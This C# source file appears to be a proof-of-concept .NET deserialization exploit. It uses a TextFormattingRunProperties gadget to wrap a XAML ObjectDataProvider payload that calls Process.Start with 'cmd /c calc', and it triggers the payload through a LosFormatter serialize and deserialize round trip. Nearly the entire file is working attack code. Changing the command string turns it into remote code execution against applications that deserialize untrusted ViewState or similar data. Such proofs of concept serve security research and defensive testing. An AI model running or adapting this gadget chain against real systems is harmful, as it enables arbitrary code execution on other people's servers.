using System;
using System.IO;
using System.Collections;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization.Formatters.Soap;
using System.Web.UI;

class Test 
{
	[Serializable]
	public class TextFormattingRunPropertiesMarshal : ISerializable
	{
		string _xaml;
		public void GetObjectData(SerializationInfo info, StreamingContext context)
		{
			Type t = Type.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
			info.SetType(t);
			info.AddValue("ForegroundBrush", _xaml);
		}
		public TextFormattingRunPropertiesMarshal(string xaml)
		{
			_xaml = xaml;
		}
	}
	
	static void Main(string[] args)
	{
		string cmd = "calc";

		string payload = @"<ResourceDictionary
			xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
			xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
			xmlns:System=""clr-namespace:System;assembly=mscorlib""
			xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
				<ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
				<ObjectDataProvider.MethodParameters>
					<System:String>cmd</System:String>
					<System:String>/c """ + cmd + @""" </System:String>
				</ObjectDataProvider.MethodParameters>
				</ObjectDataProvider>
		</ResourceDictionary>";

		Object obj = new TextFormattingRunPropertiesMarshal(payload);
		LosFormatter fmt = new LosFormatter();
		MemoryStream ms = new MemoryStream();
		fmt.Serialize(ms, obj);
		ms.Position = 0;
		fmt.Deserialize(ms);
	}
}